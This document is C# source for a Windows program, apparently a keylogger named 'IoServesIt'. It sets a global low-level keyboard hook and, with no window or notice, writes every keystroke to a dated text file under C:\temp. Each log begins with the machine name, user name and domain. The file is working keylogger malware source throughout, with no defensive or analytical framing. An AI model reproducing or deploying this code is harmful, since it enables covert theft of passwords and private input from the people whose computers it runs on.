using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Mime;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace IoServesIt
{
    static class Program
    {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;

        private static LowLevelKeyboardProc _proc = HookCallback;

        private static string _currentLog = $@"C:\temp\{DateTime.Now:yyMMdd}.txt";

        private static IntPtr _hookID = IntPtr.Zero;

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod,
            uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        private static string[] _directories = {$@"C:\temp"};

        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            var dirs = CheckDirs(_directories);
            if (!dirs)
            {
                //TODO: Do something
            }

            var files = CheckFiles();

            if (!files)
            {
                // TODO: Do Something
            }
            _hookID = SetHook(_proc);
            Application.Run();
            UnhookWindowsHookEx(_hookID);
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode < 0 || wParam != (IntPtr) WM_KEYDOWN) return CallNextHookEx(_hookID, nCode, wParam, lParam);

            var vkCode = Marshal.ReadInt32(lParam);
            var keyName = Enum.GetName(typeof(Keys), vkCode);

            // *** Handle the key press here ***
            var text = ((Keys)vkCode).ToString();
            File.AppendAllText(_currentLog, text.Length > 1 ? $@"{text}{Environment.NewLine}" : text);

            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        private static bool CheckDirs(string[] directories)
        {
            try
            {
                foreach(var dir in directories)
                    if (!Directory.Exists(dir))
                        Directory.CreateDirectory(dir);
                return true;
            }
            catch (Exception e)
            {
                // TODO: Document Exception
                // TODO: Log?
                return false;
            }
        }

        private static bool CheckFiles()
        {
            try
            {
                if (!File.Exists(_currentLog))
                {
                    using (var fs = File.Create(_currentLog))
                    {
                        var encoder = new UTF8Encoding();
                        var machineInfo = $"Machine Name: {Environment.MachineName}{Environment.NewLine}" +
                                          $"Current User: {Environment.UserName}{Environment.NewLine}" +
                                          $"Current Domain: {Environment.UserDomainName}{Environment.NewLine}";

                        fs.Write(encoder.GetBytes(machineInfo), 0, encoder.GetByteCount(machineInfo));
                        fs.Flush();
                    }
                }

                return true;
            }
            catch (Exception e)
            {
                // TODO: Document Exception
                // TODO: Log?
                return false;
            }
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (var currentProcess = Process.GetCurrentProcess())
            using (var currentModule = currentProcess.MainModule)
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(currentModule.ModuleName), 0);
        }
    }
}
